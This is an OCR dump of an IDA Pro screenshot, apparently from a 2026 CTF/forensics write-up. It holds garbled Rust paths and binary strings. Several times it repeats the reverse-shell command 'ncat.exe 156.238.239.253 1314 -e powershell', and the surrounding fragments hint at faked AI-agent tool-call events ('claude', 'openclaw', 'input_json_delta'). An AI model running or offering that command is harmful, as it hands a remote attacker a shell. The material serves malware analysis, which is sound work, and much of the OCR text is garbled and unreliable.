@@ -1,0 +1,37 @@
+# OCR: Pasted_image_20260414163758.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260414163758.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:42
+
+IDA View-A
+Address
+x
+Length
+.rdata:0... 0000002B.rdata:0... 0000005B.rdata:0. 0000004c.rdata:0.. 00000051.rdata:0.. 00000054.rdata:0...0000005A.rdata:0. 0000002B.rdata:0.. 00000052.rdata:0... 0000002E.rdata:0.. 00000010.rdata:0...0000000c.rdata:0.. 0000000A.rdata:0.. 0000000A.rdata:0.. 0000004F.rdata:0... 0000000A.rdata:0...00000032.rdata:0... 0000002E.rdata:0... 0000000F.rdata:o...o00o0ooE.rdata:0... 00000006.rdata:0... 00000031.rdata:0...0000003F.rdata:0... 0000000A
+AA0AA00L
+闻
+Pseudocode-A
+Types
+string
+C C C C C C C
+C C C C C C C C C C C C C C c
+x
+strings
+x
+可
+Hex View-1
+Irust/deps/hashbrown-0.16.1/src/raw/mod.rs
+x
+Local Types
+root/.cargo/registny/src/index.crates.io-1949cf8c6b5b557f/hashbrown-0/rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/Library/core/src/fmt/m/rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library/alloc/src/raw/rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/Library/core/src/num/f/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-/rust/deps/dimailoc-é.2.1i/src/dmalloc.rs
+/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/itoa-1.0.17
+.incat.exe 156.238.239.253 1314 -e powershell fioating point
+vcharacter Itinteger Itboolean
+rDoNEjtypemessage_startcontent_block_deltadeltatext_deltainput_json_de"commandy"
+indexncat.exe 156.238.239.253 1314 -e powershell\n
+bashevent: content_bLock_deltapartial-jison
+claudeopenclaw inputcommandH/v
+HIV
+in
+Anncat.exe156.238.239.2531314-epowershelln..
+Attempted to initialize thread-Local while it is being dropped  mid > len
